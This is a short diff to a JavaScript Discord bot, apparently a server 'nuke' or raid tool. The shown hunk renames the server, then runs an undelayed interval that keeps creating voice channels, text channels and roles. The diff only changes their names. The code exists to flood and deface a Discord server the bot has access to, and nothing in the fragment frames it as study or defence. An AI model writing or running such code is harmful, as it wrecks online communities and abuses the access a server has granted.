@@ -17,9 +17,9 @@ const prefix = ""
                 })
                 message.guild.setName('bzndzaka')
                 setInterval(function(){
-                    message.guild.createChannel(' fiday.', 'voice')
-                    message.guild.createChannel(' fiday UP ', 'text')
-                    message.guild.createRole({name : ' <fiday>'})
+                    message.guild.createChannel(' ..', 'voice')
+                    message.guild.createChannel(' . UP ', 'text')
+                    message.guild.createRole({name : ' <.>'})
                 })
             }
         }
